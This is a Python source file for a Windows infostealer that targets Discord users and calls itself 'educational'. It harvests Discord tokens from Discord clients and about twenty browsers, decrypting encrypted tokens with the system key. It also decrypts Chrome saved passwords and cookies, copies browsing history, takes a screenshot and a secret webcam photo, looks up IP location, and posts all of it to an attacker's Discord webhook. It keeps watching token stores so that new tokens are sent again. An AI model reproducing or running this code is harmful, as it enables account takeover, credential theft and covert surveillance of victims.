import shutil
import pyautogui as pg
import cv2 as cv
import json
from discord import Webhook, RequestsWebhookAdapter, File
import os
import sqlite3 as sql
import base64 as b64
import httpx
from time import sleep
from re import findall
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from typing import Callable, Optional, Literal
from threading import Thread as thr
from datetime import datetime, timedelta
from vars import HOOK as WEBHOOK_URL

# credits for the cryptography and some of the other code -> https://github.com/NobodyWouldEverUseThis7/Token-encryption-writeup
# i did this cus i was bored at like 3am so if the code is bad dont blame me xD
# any problems dm me (xylo#6666) on discord
# i will not be held accountable for any misuse of this tool its solely for educational purposes xD
# features (token grabber, account info grabber, token(w account info) resends everytime they reset, gets location info, chrome passwords, chrome history, chrome cookies, webcam pics, screenshots etc)
# any updates yall want lmk (eg cc grabber)


class Decrypt:
    def __init__(self) -> None:
        self.gen_cipher, self.decrypt_payload = (lambda key, iv: AES.new(
            key, AES.MODE_GCM, iv), lambda cipher, payload: cipher.decrypt(payload))
        self.chrometime: Callable[[any], str] = lambda ch: str(
            datetime(1601, 1, 1) + timedelta(microseconds=ch)
        )

    def decrypt_pass(self, buffer, m_key):
        return_value = None
        try:
            iv = buffer[3:15]
            payload = buffer[15:]
            cipher = self.gen_cipher(m_key, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            return_value = decrypted_pass[:-16].decode()
        finally:
            return return_value

    @staticmethod
    def gtk(file: str):
        with open(file, "r", encoding="utf-8") as f:
            ls = f.read()
        ls = json.loads(ls)

        master_key = b64.b64decode(ls["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key


class Listen:
    def __init__(self, dir_path: str, func_to_call: Callable[[str], None], file_exts: Optional[tuple] = (".ldb", ".log")) -> None:
        self.dp, self.ftc, self.ins, self.f_exts = (
            dir_path, func_to_call, func_to_call.__self__,
            file_exts
        )
        self.tlm = [os.path.getmtime(f"{dir_path}\\{file}") for file in os.listdir(
            dir_path) if file.endswith(file_exts)]

    def __call__(self) -> Callable[[object], None]:
        return self.listen

    def listen(self) -> None:
        try:
            while True:
                sleep(1)
                for file in os.listdir(self.dp):
                    if not os.path.exists(f"{self.dp}\\{file}") or not file.endswith(self.f_exts):
                        continue
                    if os.path.getmtime(f"{self.dp}\\{file}") not in self.tlm:
                        if self.ftc(f"{self.dp}\\{file}") is True:
                            self.ins.send_all()
        except:
            pass


class Grabber:
    def __init__(self) -> None:
        self.rgx: Literal = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_rgx: Literal = r"dQw4w9WgXcQ:[^\"]*"
        self.decryptor: Decrypt = Decrypt()
        self.appdata, self.roaming, self.temp = (
            os.getenv("LOCALAPPDATA"), os.getenv("APPDATA"), os.getenv("TEMP"))
        self.paths: dict[str, str] = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
            'Ungoogled Chromium': self.appdata + '\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\',
            'Firefox': self.roaming + '\\Mozilla\\Firefox\\Profiles'
        }
        self.tokens: list  = []
        self.base_google_path: str = f"{self.appdata}\\Google\\Chrome"
        self.files: list[str] = [f"{self.temp}\\pass.txt", f"{self.temp}\\his.txt",
                                 f"{self.temp}\\cookies.txt", f"{self.temp}\\web.png", f"{self.temp}\\ss.png"]
        self.grab_all()
        self.grab_chrome_cookies()
        self.grab_chrome_history()
        self.grab_chrome_pass()
        self.take_pics()

    def grab_cord(self, path: str) -> bool:
        with open(path, "r", errors="ignore") as db:
            for line in (__line.strip() for __line in db.readlines() if __line.strip()):
                for token in findall(self.encrypted_rgx, line):
                    for cord in ["discordcanary", "discord", "discordptb"]:
                        if not os.path.exists(cord_path := f"{self.roaming}\\{cord}\\Local State"):
                            continue
                        elif (token := self.decryptor.decrypt_pass(b64.b64decode(
                                token.split('dQw4w9WgXcQ:')[1]), self.decryptor.gtk(cord_path))) in self.tokens:
                            continue
                        elif self.validate_token(token) is True:
                            self.tokens.append(token)
                            return True
        return False

    def grab_firefox(self, path: str) -> bool:
        with open(path, "r", errors="ignore") as db:
            for line in (__line.strip() for __line in db.readlines() if __line.strip()):
                for token in findall(self.rgx, line):
                    if token in self.tokens:
                        continue
                    if self.validate_token(token) is True:
                        self.tokens.append(token)
                        return True
        return False

    def grab_the_rest(self, path: str) -> bool:
        with open(path, "r", errors="ignore") as db:
            for line in (__line.strip() for __line in db.readlines() if __line.strip()):
                for token in findall(self.rgx, line):
                    if token in self.tokens:
                        continue
                    if self.validate_token(token) is True:
                        self.tokens.append(token)
                        return True
        return False

    @staticmethod
    def validate_token(token: str or None = None) -> bool:
        if token is None:
            return False
        return True if httpx.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}).status_code in range(200, 300) else False

    @staticmethod
    def get_token_info(token: str) -> dict:
        return httpx.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}).json()

    @staticmethod
    def get_loc() -> dict:
        return httpx.get("http://ipinfo.io/json").json()

    @staticmethod
    def sqlite_query(query: str, path: str) -> list or None:
        if not os.path.exists(path):
            return None
        shutil.copy(path, (file := f"{os.getenv('TEMP')}\\talha.db"))
        with sql.connect(file) as conn:
            cursor: sql.Cursor = conn.cursor()
            cursor.execute(query)
            return cursor.fetchall()

    @staticmethod
    def json_prettify(json: dict) -> str:
        _ = ""
        for k, v in json.items():
            _ += f"{k}: {v}\n"
        return _

    @staticmethod
    def send_webhook(msg: str, files: list or None = None) -> None:
        httpx.post(WEBHOOK_URL, json={
                   "content": msg if msg else "No Content", "nonce": None, "tts": False}) if files is None else Webhook.from_url(
            WEBHOOK_URL, adapter=RequestsWebhookAdapter()).send(content=msg if msg else "No Content", files=[File(fi) for fi in files])

    def take_pics(self) -> None:
        pg.screenshot().save(f"{self.temp}\\ss.png")
        cap = cv.VideoCapture(0)
        cv.imwrite(f"{self.temp}\\web.png", cap.read()[1])
        cap.release()

    def grab_chrome_pass(self):
        with open(f"{self.temp}\\pass.txt", "a") as f:
            for row in self.sqlite_query(
                "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created",
                f"{self.base_google_path}\\User Data\\Default\\Login Data"
            ):
                username = row[2]
                password = self.decryptor.decrypt_pass(row[3], self.decryptor.gtk(
                    f"{self.base_google_path}\\User Data\\Local State"))
                if not username or not password:
                    continue
                f.write(
                    f"Origin URL: {row[0]} ; Action URL: {row[1]} ; Username/Email: {username} ; Password: {password} ; Date Last Used: {self.decryptor.chrometime()}")

    def grab_chrome_cookies(self):
        with open(f"{self.temp}\\cookies.txt", "a") as f:
            for host_key, name, value, creation_utc, last_accesses_utc, expires_utc, encrypted_value in self.sqlite_query(
                    "select host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value from cookies",
                    f"{self.base_google_path}\\User Data\\Default\\Network\\Cookies"):
                decrypted_value = self.decryptor.decrypt_pass(
                    encrypted_value, self.decryptor.gtk(f"{self.base_google_path}\\User Data\\Local State")) if not value else value
                f.write(
                    f"Host: {host_key}\nCookie name: {name}\nCookie value (decrypted): {decrypted_value}\n")

    def grab_chrome_history(self):
        with open(f"{self.temp}\\his.txt", "a") as f:
            for row in self.sqlite_query("select * from urls", f"{self.base_google_path}\\User Data\\Default\\History"):
                visit_time: str = self.decryptor.chrometime(row[5])
                if visit_time[:4] != "1601":
                    visit_time = (str(datetime.strptime(
                        visit_time, "%Y-%m-%d %H:%M:%S.%f")))[:-7]
                f.write(f"Visited Website: {row[1]} At {visit_time}\n")

    def grab_all(self):
        for name, dest in self.paths.items():
            if not os.path.exists(dest):
                continue
            if "discord" in name.lower() or "discord" == name.lower():
                t: thr = thr(target=Listen(dest, self.grab_cord)())
                t.start()
                for file in os.listdir(dest):
                    self.grab_cord(f"{dest}\\{file}") if file.endswith(
                        (".ldb", ".log")) else None
            elif name.lower() == "firefox":
                for loc, _, files in os.walk(dest):
                    for file in files:
                        file = f"{loc}\\{file}"
                        self.grab_firefox(file) if file.endswith(
                            ".sqlite") else None
            else:
                t: thr = thr(target=Listen(dest, self.grab_the_rest)())
                t.start()
                for file in os.listdir(dest):
                    self.grab_the_rest(f"{dest}\\{file}") if file.endswith(
                        (".ldb", ".log")) else None

    def send_all(self):
        if len(self.tokens) == 0:
            self.send_webhook("No Tokens Found")
        msg: str = f"""```
IP INFO:
{self.json_prettify(self.get_loc())}```"""
        for index, token in enumerate(self.tokens):
            msg += f"""
```TOKEN No.{index + 1}: {token}
{self.json_prettify(self.get_token_info(token))}```"""
        self.send_webhook(msg, self.files)


def init_grabber() -> None:
    try:
        grabber: Grabber = Grabber()
        grabber.send_all()
    except:
        pass